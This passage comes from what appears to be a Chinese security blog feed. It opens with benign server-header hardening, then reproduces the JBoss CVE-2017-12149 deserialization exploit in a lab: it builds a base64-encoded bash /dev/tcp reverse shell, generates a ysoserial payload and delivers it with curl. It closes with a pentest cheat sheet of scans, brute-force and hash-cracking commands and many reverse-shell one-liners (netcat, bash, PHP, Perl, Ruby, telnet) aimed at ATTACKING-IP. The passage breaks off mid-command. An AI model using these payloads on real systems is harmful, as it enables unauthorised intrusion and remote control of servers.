class="hljs-attribute">ServerTokens</span> Prod<br><span class="hljs-attribute">ServerSignature</span> <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure><h3 id="PHP">PHP</h3><p>修改php配置文件 <code>php.ini</code> 将 <code>expose_php On</code> 改为：<code>expose_php Off</code>。</p><h3 id="IIS">IIS</h3><p><strong>移除Server</strong></p><p>借助IIS URL Rewrite Module，添加如下的重写规则。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">rewrite</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">allowedServerVariables</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">add</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">allowedServerVariables</span>&gt;</span>            <br>        <span class="hljs-tag">&lt;<span class="hljs-name">outboundRules</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">rule</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;REMOVE_RESPONSE_SERVER&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">match</span> <span class="hljs-attr">serverVariable</span>=<span class="hljs-string">&quot;RESPONSE_SERVER&quot;</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;.*&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;Rewrite&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">rule</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">outboundRules</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rewrite</span>&gt;</span><br></code></pre></td></tr></table></figure><p>存放在 <code>C:\Windows\System32\inetsrv\config\applicationHost.config </code>中。</p><p><strong>移除X-AspNet-Version</strong></p><p>在 <code>web.config</code> 的 <code>&lt;httpRuntime&gt;</code> 中添加 <code>enableVersionHeader=&quot;false&quot;</code>。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;httpRuntime enableVersionHeader<span class="hljs-operator">=</span><span class="hljs-string">&quot;false&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p>移除X-AspNetMvc-Version</p><p>在 <code>Application_Start()</code> 中添加如下代码:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Application_Start</span>()</span> <br>&#123; <br>    MvcHandler.DisableMvcResponseHeader = <span class="hljs-literal">true</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>移除X-Powered-By</p><p>在IIS Manager的HTTP Response Headers中移除X-Powered-By</p><p><img src="https://ae01.alicdn.com/kf/HTB15FyiaA9E3KVjSZFG76319XXaa.png" alt=""></p><h3 id="Nginx">Nginx</h3><p>在 <code>conf/nginx.conf</code>加入</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">server_tokens</span> <span class="hljs-literal">off</span>;<br></code></pre></td></tr></table></figure><h3 id="Tomact">Tomact</h3><p>到apache-tomcat安装目录下的lib子文件夹，找到catalina.jar这包，并进行解解压。</p><p>修改 <code>lib\catalina.zip\org\apache\catalina\util\ServerInfo.properties</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">server</span>.info=X<br><span class="hljs-attribute">server</span>.number=<span class="hljs-number">5</span>.<span class="hljs-number">5</span><br><span class="hljs-attribute">server</span>.built=Dec <span class="hljs-number">1</span> <span class="hljs-number">2015</span> <span class="hljs-number">22</span>:<span class="hljs-number">30</span>:<span class="hljs-number">46</span> UTC<br></code></pre></td></tr></table></figure><p>Referrer:<br><a href="https://blog.csdn.net/A11085013/article/details/78864807">https://blog.csdn.net/A11085013/article/details/78864807</a></p>]]></content>
    
    
    <categories>
      
      <category>转载搬运</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>远程代码执行</title>
    <link href="/posts/3b22e763.html"/>
    <url>/posts/3b22e763.html</url>
    
    <content type="html"><![CDATA[<p>原文：倾旋 <a href="https://payloads.online/archivers/2018-03-22/1">https://payloads.online/archivers/2018-03-22/1</a></p><h2 id="0x00-远程代码执行-介绍">0x00 远程代码执行-介绍</h2><h3 id="什么是远程代码执行">什么是远程代码执行</h3><p>远程命令执行 英文名称：RCE (remote code execution) ，简称RCE漏洞，是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p><h3 id="远程代码执行的特点">远程代码执行的特点</h3><p>远程代码执行是指攻击者可能会通过远调用的方式来攻击或控制计算机设备，无论该设备在哪里。</p><h2 id="0x01-远程代码执行-风险等级">0x01 远程代码执行-风险等级</h2><p>** <code>高</code> **</p><h2 id="0x02-远程代码执行-原理">0x02 远程代码执行-原理</h2><p>由于开发人员编写源码，没有针对代码中可执行的特殊函数入口做过滤，导致客户端可以提交恶意构造语句提交，并交由服务器端执行。命令注入攻击中WEB服务器没有过滤类似system(),eval()，exec()等函数是该漏洞攻击成功的最主要原因。</p><h2 id="0x03-远程代码执行-常见场景">0x03 远程代码执行-常见场景</h2><h3 id="使用了危险函数的Web应用">使用了危险函数的Web应用</h3><h3 id="低版本的Java语言Struts框架">低版本的Java语言Struts框架</h3><h2 id="0x04-测试方案">0x04 测试方案</h2><h3 id="PHP中常见场景-模板引擎代码执行">PHP中常见场景-模板引擎代码执行</h3><p><strong>Smarty 简介</strong></p><blockquote><p>Smarty是一个PHP的模板引擎。更明确来说，它可以帮助开发者更好地 分离程序逻辑和页面显示。最好的例子，是当程序员和模板设计师是不同的两个角色的情况，而且 大部分时候都不是同一个人的情况。</p><p>CVE-ID : CVE-2017-1000480</p></blockquote><p>产生原因： 由于未对用户的输入点进行过滤，导致经过eval函数，造成代码执行。</p><p>测试Payload：</p><p><img src="https://ae01.alicdn.com/kf/HTB1vFCjaA9E3KVjSZFG76319XXap.png" alt="0x01.png"></p><h3 id="Java-Struts2-S2-045">Java Struts2(S2-045)</h3><p>Struts 简介</p><blockquote><p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。</p><p>CVE-ID : CVE-2017-5638</p></blockquote><p>产生原因：由于未对用户输入点进行过滤，被带入ErrorMessage，当做OGLN表达式解析，造成代码执行。</p><p>测试Payload：</p><p><img src="https://ae01.alicdn.com/kf/HTB18NChawmH3KVjSZKz7622OXXaW.png" alt="0x02.png"></p><h2 id="0x05-修复方案">0x05 修复方案</h2><p>升级插件、框架新版本。</p>]]></content>
    
    
    <categories>
      
      <category>转载搬运</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jboss反序列化漏洞(CVE-2017-12149)</title>
    <link href="/posts/1de3639b.html"/>
    <url>/posts/1de3639b.html</url>
    
    <content type="html"><![CDATA[<h3 id="漏洞介绍">漏洞介绍</h3><blockquote><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下就将来自客户端的数据流进行反序列化，从而导致了漏洞。远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。</p></blockquote><h3 id="漏洞复现">漏洞复现</h3><p>克隆 <code>vulnhub</code> 的项目到本地，cd到对应的文件夹，启动docker，然后执行以下命令开始下载测试环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure><p>浏览器访问 <code>http://192.168.33.137:8080</code> 即可看到JBoss默认页面</p><p><img src="https://ae01.alicdn.com/kf/HTB1xZqnaBGw3KVjSZFD760WEpXa2.png" alt=""></p><p>漏洞存在 <code>/invoker/readonly/</code>请求中，此处服务器将用户提交的POST内容进行了Java反序列化</p><p><img src="https://ae01.alicdn.com/kf/HTB1azSgavWG3KVjSZPc762kbXXa0.png" alt=""></p><p>下载用于生成序列化数据的<a href="https://github.com/frohoff/ysoserial" title="ysoserial">ysoserial</a>，使用bash反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/192.168.33.137/6666 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法,需要进行编码，而且漏洞复现文档里所提到的编码工具已经找不到，那就只能手动拼凑一下了</p><p>模型： <code>bash -c &#123;echo,base64编码后的shell命令&#125; | &#123;base64,-d&#125; | &#123;bash,-i&#125;</code></p><p>先把shell命令base64编码:<br><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEzNy82NjY2IDA+JjEK</code></p><p>然后替换echo后面的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -c &#123;<span class="hljs-built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEzNy82NjY2IDA+JjEK&#125; | &#123;<span class="hljs-built_in">base64</span>,-d&#125; | &#123;bash,-i&#125;<br></code></pre></td></tr></table></figure><p>使用 <code>ysoserial</code> 生成Payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections1 <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMzLjEzNy82NjY2IDA+JjEK&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> &gt; poc.ser<br></code></pre></td></tr></table></figure><p>kali nc监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 6666<br></code></pre></td></tr></table></figure><p>向存在漏洞的请求地址发送poc：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://192.168.33.137:8080/invoker/readonly --data-binary @poc.ser<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1pZV7Xkxz61VjSZFt761DSVXat.png" alt=""></p><p>成功反弹shell</p><p><img src="https://ae01.alicdn.com/kf/HTB168mmaBKw3KVjSZFO761rDVXax.png" alt=""></p><p>参考：</p><p><a href="https://www.cnblogs.com/ikari/p/8989821.html">https://www.cnblogs.com/ikari/p/8989821.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>JBoss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小本本--备忘录</title>
    <link href="/posts/554d428f.html"/>
    <url>/posts/554d428f.html</url>
    
    <content type="html"><![CDATA[<h2 id="center-枚举-center"><center>枚举</center></h2><h3 id="常规枚举">常规枚举</h3><p>显示详细信息，同步，扫描所有端口，使用所有脚本，不探测主机是否存活</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -vv -Pn -A -sC -sS -T 4 -p- 192.168.1.1<br></code></pre></td></tr></table></figure><p>显示详细信息，SYN扫描，版本信息和针对服务的脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -v -sS -A -T4 192.168.1.1<br></code></pre></td></tr></table></figure><p>扫描易受攻击的SMB服务器的Nmap脚本</p><p>注意：unsafe = 1可能会导致中断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 [host]<br></code></pre></td></tr></table></figure><p>获取同网段其他主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bah">netdiscover -r 192.168.1.0/24<br></code></pre></td></tr></table></figure><h3 id="FTP-21">FTP (21)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 192.168.1.1<br></code></pre></td></tr></table></figure><h3 id="SSH-22">SSH (22)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh [ip] 22<br></code></pre></td></tr></table></figure><h3 id="SMTP-25">SMTP (25)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 192.168.1.1<br><br>nc -nvv [ip] 25<br><br>telnet [ip] 25<br></code></pre></td></tr></table></figure><h3 id="Web-80-443">Web (80/443)</h3><p>birbuster(GUI)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirb http://192.168.1.1/<br><br>nikto -h 192.168.1.1<br></code></pre></td></tr></table></figure><h3 id="Pop3-110">Pop3 (110)</h3><p>telnet [ip] 110</p><p>USER [username]</p><p>PASS [password]</p><p>列出信息 <code>LIST</code></p><p>查找邮件 <code>RETR [message number]</code></p><h3 id="RPCBind-111">RPCBind (111)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpcinfo –p 192.168.1.1<br></code></pre></td></tr></table></figure><h3 id="SMB-RPC-139-445">SMB\RPC (139/445)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bahs">enum4linux –a 192.168.1.1<br></code></pre></td></tr></table></figure><p>枚举子网上的Windows/Samba服务器，查找Windows MAC地址，netbios名称并发现客户端工作组/域</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nbtscan 192.168.1.1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.1.1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap IPADDR --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse<br></code></pre></td></tr></table></figure><p>列出Ipc共享</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //192.168.1.X/<br><br>smbclient //192.168.1.X/ipc$ -U user<br></code></pre></td></tr></table></figure><h3 id="SNMP-161">SNMP (161)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 10.0.0.0<br><br>snmpcheck -t 192.168.1.X -c public<br><br>onesixtyone -c names -i hosts<br><br>nmap -sT -p 161 192.168.X.X -oG snmp_results.txt<br><br>snmpenum -t 192.168.1.X<br></code></pre></td></tr></table></figure><h3 id="Oracle-1521">Oracle (1521)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">tnscmd10g version -h 192.168.X.X<br><br>tnscmd10g status -h 192.168.X.X<br></code></pre></td></tr></table></figure><h3 id="Mysql-3306">Mysql (3306)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -Pn -vv  192.168.1.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122<br></code></pre></td></tr></table></figure><h3 id="DNS区域传输">DNS区域传输</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nslookup -&gt; <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span>=any -&gt; <span class="hljs-built_in">ls</span> -d baidu.com<br><br>dig axfr baidu.com @ns1.baidu.com<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml<br></code></pre></td></tr></table></figure><h3 id="挂载文件共享">挂载文件共享</h3><p><code>showmount -e</code></p><p>将共享挂载到/ mnt / nfs而不锁定它</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount 192.168.1.1:/vol/share /mnt/nfs  -nolock<br></code></pre></td></tr></table></figure><p>在Linux上挂载Windows CIFS/SMB共享位于/mnt/cifs如果删除密码，它将在CLI上提示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount -tcifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs<br></code></pre></td></tr></table></figure><h3 id="指纹识别">指纹识别</h3><p>通过显示横幅进行基本版本控制/指纹识别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -v 192.168.1.1 25<br><br>telnet 192.168.1.1 25<br></code></pre></td></tr></table></figure><h3 id="搜索利用exp">搜索利用exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit windows 2003 | grep -i <span class="hljs-built_in">local</span><br></code></pre></td></tr></table></figure><h3 id="编译EXP">编译EXP</h3><p>编译C代码，在’gcc’之后添加<code>-m32</code>，用于在64位Linux上编译32位代码,不添加则编译64位的exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -o exploit exploit.c<br></code></pre></td></tr></table></figure><p>在Linux上编译windows .exe</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe<br></code></pre></td></tr></table></figure><h3 id="检测数据包">检测数据包</h3><p>tcpdump用于接口eth0上的端口80，输出到output.pcap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump tcp port 80 -w output.pcap -i eth0<br></code></pre></td></tr></table></figure><h3 id="密码破解">密码破解</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">hash-identifier [<span class="hljs-built_in">hash</span>]<br><br>john hashes.txt<br><br>hashcat -m 500 -a 0 -o output.txt –remove hashes.txt /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href="https://hashkiller.co.uk/">https://hashkiller.co.uk/</a></p><h3 id="暴力破解">暴力破解</h3><p>web post表单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra 10.0.0.1 http-post-form “/admin.php:target=auth&amp;mode=login&amp;user=^USER^&amp;password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt -o results.txt [ip] [协议]<br></code></pre></td></tr></table></figure><p>爆破SMTP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp –V<br></code></pre></td></tr></table></figure><h2 id="center-Shells-Reverse-Shells-center"><center>Shells &amp; Reverse Shells</center></h2><h3 id="SUID-C-Shells">SUID C Shells</h3><p><strong>/bin/bash</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>/bin/sh</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="TTY-Shell">TTY Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br><span class="hljs-built_in">echo</span> os.system(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)<br><br>/bin/sh –i<br><br>execute(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br><br>!sh <span class="hljs-comment">#nmap</span><br><br><span class="hljs-string">&quot;!bash #vi</span><br></code></pre></td></tr></table></figure><h3 id="Spawn-Ruby-Shell">Spawn Ruby Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br><br>ruby -rsocket -e<span class="hljs-string">&#x27;f=TCPSocket.open(&quot;ATTACKING-IP&quot;,80).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d</span><br></code></pre></td></tr></table></figure><h3 id="Netcat">Netcat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/sh ATTACKING-IP 80<br><br>/bin/sh | nc ATTACKING-IP 80<br><br><span class="hljs-built_in">rm</span> -f /tmp/p; <span class="hljs-built_in">mknod</span> /tmp/p p &amp;&amp; nc ATTACKING-IP 4444 0/tmp/p<br></code></pre></td></tr></table></figure><h3 id="telnet反弹Shell">telnet反弹Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -f /tmp/p; <span class="hljs-built_in">mknod</span> /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p<br><br>telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443<br></code></pre></td></tr></table></figure><h3 id="PHP">PHP</h3><p>假设TCP使用文件描述符3.如果它不起作用，请尝试4,5或6）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;ATTACKING-IP&quot;,80);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="Bash">Bash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0<br><br>0&lt;&amp;196;<span class="hljs-built_in">exec</span> 196&lt;&gt;/dev/tcp/ATTACKING-IP/80; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196<br><br><span class="hljs-built_in">exec</span> 5&lt;&gt;/dev/tcp/ATTACKING-IP/80 <span class="hljs-built_in">cat</span> &lt;&amp;5 | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> line; <span class="hljs-keyword">do</span> <span class="hljs-variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="hljs-keyword">done</span><br><br>bash -i &gt;&amp; /dev/tcp/ATTACKING-IP/80 0&gt;&amp;1<br></code></pre></td></tr></table></figure><h3 id="Perl">Perl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><br>perl —e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><br>perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;ATTACKING-IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br><br>perl -MIO -e <span class="hljs-string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;ATTACKING-IP:80&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br><br>perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;ATTACKING-IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh 